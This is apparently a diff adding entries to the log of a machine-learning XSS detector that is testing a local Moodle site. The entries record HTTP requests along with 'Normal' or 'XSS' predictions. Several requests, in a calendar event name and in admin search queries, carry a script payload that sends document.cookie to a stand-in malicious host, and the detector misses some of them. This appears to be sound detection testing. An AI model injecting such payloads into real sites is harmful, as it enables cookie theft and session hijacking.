@@ -9364,3 +9364,291 @@ c
 }
 2025-05-05 11:37:57,380 - INFO - [05/05/2025 11:37:57] Prediksi: Normal
 2025-05-05 11:37:57,381 - INFO - [05/05/2025 11:37:57] Hasil prediksi: {'prediction': 'Normal'}
+2025-05-05 11:43:22,522 - INFO - [05/05/2025 11:43:22] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": "",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "43"
+        },
+        "eventtype": "user",
+        "categoryid": "1",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "914472998"
+        },
+        "location": "",
+        "duration": "0",
+        "timedurationuntil": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "43"
+        },
+        "timedurationminutes": "",
+        "repeats": "1",
+        "submitted_at": "2025-05-05T04:43:25.361Z"
+    }
+}
+2025-05-05 11:43:22,553 - INFO - [05/05/2025 11:43:22] Prediksi: Normal
+2025-05-05 11:43:34,796 - INFO - [05/05/2025 11:43:34] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": " <script>fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);</script>",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "43"
+        },
+        "eventtype": "user",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "914472998"
+        },
+        "location": "",
+        "duration": "0",
+        "submitted_at": "2025-05-05T04:43:37.619Z"
+    }
+}
+2025-05-05 11:43:34,815 - INFO - [05/05/2025 11:43:34] Prediksi: Normal
+2025-05-05 11:43:36,184 - INFO - [05/05/2025 11:43:36] IP: ::1 | User-ID: 2 | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/",
+    "body": {
+        "id": "0",
+        "userid": "2",
+        "modulename": "",
+        "instance": "0",
+        "visible": "1",
+        "sesskey": "iCrmDimoF8",
+        "_qf__core_calendar_local_event_forms_create": "1",
+        "mform_showmore_id_general": "0",
+        "name": " <script>fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);</script>",
+        "timestart": {
+            "day": "5",
+            "month": "5",
+            "year": "2025",
+            "hour": "11",
+            "minute": "43"
+        },
+        "eventtype": "user",
+        "description": {
+            "text": "",
+            "format": "1",
+            "itemid": "914472998"
+        },
+        "location": "",
+        "duration": "0",
+        "submitted_at": "2025-05-05T04:43:38.817Z"
+    }
+}
+2025-05-05 11:43:36,203 - INFO - [05/05/2025 11:43:36] Prediksi: Normal
+2025-05-05 11:56:21,754 - INFO - [05/05/2025 11:56:21] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/my/courses.php",
+    "body": ""
+}
+2025-05-05 11:56:21,778 - INFO - [05/05/2025 11:56:21] Prediksi: Normal
+2025-05-05 11:56:22,490 - INFO - [05/05/2025 11:56:22] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/courses.php",
+    "body": {
+        "submitted_at": "2025-05-05T04:56:25.346Z"
+    }
+}
+2025-05-05 11:56:22,508 - INFO - [05/05/2025 11:56:22] Prediksi: Normal
+2025-05-05 11:56:22,509 - INFO - [05/05/2025 11:56:22] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/courses.php",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/my/courses.php",
+        "context": "1",
+        "submitted_at": "2025-05-05T04:56:25.346Z"
+    }
+}
+2025-05-05 11:56:22,530 - INFO - [05/05/2025 11:56:22] Prediksi: Normal
+2025-05-05 11:56:23,542 - INFO - [05/05/2025 11:56:23] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/courses.php",
+    "body": {
+        "submitted_at": "2025-05-05T04:56:25.347Z"
+    }
+}
+2025-05-05 11:56:23,570 - INFO - [05/05/2025 11:56:23] Prediksi: Normal
+2025-05-05 11:56:31,687 - INFO - [05/05/2025 11:56:31] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/my/",
+    "body": ""
+}
+2025-05-05 11:56:31,745 - INFO - [05/05/2025 11:56:31] Prediksi: Normal
+2025-05-05 11:56:32,304 - INFO - [05/05/2025 11:56:32] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/index.php",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/my/index.php",
+        "context": "5",
+        "submitted_at": "2025-05-05T04:56:35.142Z"
+    }
+}
+2025-05-05 11:56:32,325 - INFO - [05/05/2025 11:56:32] Prediksi: Normal
+2025-05-05 11:56:34,019 - INFO - [05/05/2025 11:56:34] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/?redirect=0",
+    "body": "redirect=0"
+}
+2025-05-05 11:56:34,059 - INFO - [05/05/2025 11:56:34] Prediksi: Normal
+2025-05-05 11:56:35,547 - INFO - [05/05/2025 11:56:35] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/?redirect=0",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/?redirect=0",
+        "context": "2",
+        "submitted_at": "2025-05-05T04:56:37.373Z"
+    }
+}
+2025-05-05 11:56:35,566 - INFO - [05/05/2025 11:56:35] Prediksi: Normal
+2025-05-05 11:56:57,048 - INFO - [05/05/2025 11:56:57] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/admin/search.php",
+    "body": ""
+}
+2025-05-05 11:56:57,064 - INFO - [05/05/2025 11:56:57] Prediksi: Normal
+2025-05-05 11:56:59,213 - INFO - [05/05/2025 11:56:59] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/admin/search.php",
+    "body": {
+        "query": "",
+        "submitted_at": "2025-05-05T04:57:01.994Z"
+    }
+}
+2025-05-05 11:56:59,232 - INFO - [05/05/2025 11:56:59] Prediksi: Normal
+2025-05-05 11:56:59,233 - INFO - [05/05/2025 11:56:59] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/admin/search.php?query",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/admin/search.php?query",
+        "context": "1",
+        "submitted_at": "2025-05-05T04:57:01.993Z"
+    }
+}
+2025-05-05 11:56:59,272 - INFO - [05/05/2025 11:56:59] Prediksi: Normal
+2025-05-05 11:57:05,141 - INFO - [05/05/2025 11:57:05] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/admin/search.php?query=Halo+semuanya%21+Saya+punya+pertanyaan+tentang+materi+ini.+%3Cscript%3Efetch%28%27https%3A%2F%2Fsitus-jahat.com%2Fambil_cookie%3Fc%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E",
+    "body": "query=Halo semuanya! Saya punya pertanyaan tentang materi ini. <script>fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);</script>"
+}
+2025-05-05 11:57:05,158 - INFO - [05/05/2025 11:57:05] Prediksi: XSS
+2025-05-05 11:57:16,451 - INFO - [05/05/2025 11:57:16] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/admin/search.php?query=Halo semuanya! Saya punya pertanyaan tentang materi ini. fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/admin/search.php?query=Halo semuanya! Saya punya pertanyaan tentang materi ini. fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);",
+        "context": "1",
+        "submitted_at": "2025-05-05T04:57:19.276Z"
+    }
+}
+2025-05-05 11:57:16,477 - INFO - [05/05/2025 11:57:16] Prediksi: Normal
+2025-05-05 11:57:16,478 - INFO - [05/05/2025 11:57:16] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/admin/search.php?query=Halo+semuanya%21+Saya+punya+pertanyaan+tentang+materi+ini.+%3Cscript%3Efetch%28%27https%3A%2F%2Fsitus-jahat.com%2Fambil_cookie%3Fc%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E",
+    "body": {
+        "query": "Halo semuanya! Saya punya pertanyaan tentang materi ini. fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);",
+        "submitted_at": "2025-05-05T04:57:19.278Z"
+    }
+}
+2025-05-05 11:57:16,494 - INFO - [05/05/2025 11:57:16] Prediksi: Normal
+2025-05-05 11:57:17,534 - INFO - [05/05/2025 11:57:17] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/admin/search.php?query=Halo+semuanya%21+Saya+punya+pertanyaan+tentang+materi+ini.+%3Cscript%3Efetch%28%27https%3A%2F%2Fsitus-jahat.com%2Fambil_cookie%3Fc%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "action": "save-settings",
+        "submitted_at": "2025-05-05T04:57:19.281Z"
+    }
+}
+2025-05-05 11:57:17,551 - INFO - [05/05/2025 11:57:17] Prediksi: Normal
+2025-05-05 11:57:37,579 - INFO - [05/05/2025 11:57:37] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/admin/search.php?query=%3Cscript%3Efetch%28%27https%3A%2F%2Fsitus-jahat.com%2Fambil_cookie%3Fc%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E",
+    "body": "query=<script>fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);</script>"
+}
+2025-05-05 11:57:37,596 - INFO - [05/05/2025 11:57:37] Prediksi: XSS
+2025-05-05 11:57:38,417 - INFO - [05/05/2025 11:57:38] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/admin/search.php?query=fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/admin/search.php?query=fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);",
+        "context": "1",
+        "submitted_at": "2025-05-05T04:57:41.276Z"
+    }
+}
+2025-05-05 11:57:38,446 - INFO - [05/05/2025 11:57:38] Prediksi: Normal
+2025-05-05 11:57:38,447 - INFO - [05/05/2025 11:57:38] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/admin/search.php?query=%3Cscript%3Efetch%28%27https%3A%2F%2Fsitus-jahat.com%2Fambil_cookie%3Fc%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E",
+    "body": {
+        "query": "fetch('https://situs-jahat.com/ambil_cookie?c='+document.cookie);",
+        "submitted_at": "2025-05-05T04:57:41.277Z"
+    }
+}
+2025-05-05 11:57:38,465 - INFO - [05/05/2025 11:57:38] Prediksi: XSS
+2025-05-05 11:57:39,487 - INFO - [05/05/2025 11:57:39] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/admin/search.php?query=%3Cscript%3Efetch%28%27https%3A%2F%2Fsitus-jahat.com%2Fambil_cookie%3Fc%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "action": "save-settings",
+        "submitted_at": "2025-05-05T04:57:41.278Z"
+    }
+}
+2025-05-05 11:57:39,504 - INFO - [05/05/2025 11:57:39] Prediksi: Normal
+2025-05-05 11:57:43,172 - INFO - [05/05/2025 11:57:43] IP: ::1 | User-ID: 2 | Input: {
+    "method": "GET",
+    "url": "/moodle/my/",
+    "body": ""
+}
+2025-05-05 11:57:43,190 - INFO - [05/05/2025 11:57:43] Prediksi: Normal
+2025-05-05 11:57:43,748 - INFO - [05/05/2025 11:57:43] IP: ::1 | User-ID: Tidak Diketahui | Input: {
+    "method": "POST",
+    "url": "http://localhost/moodle/my/index.php",
+    "body": {
+        "sesskey": "iCrmDimoF8",
+        "pageurl": "http://localhost/moodle/my/index.php",
+        "context": "5",
+        "submitted_at": "2025-05-05T04:57:46.609Z"
+    }
+}
+2025-05-05 11:57:43,772 - INFO - [05/05/2025 11:57:43] Prediksi: Normal
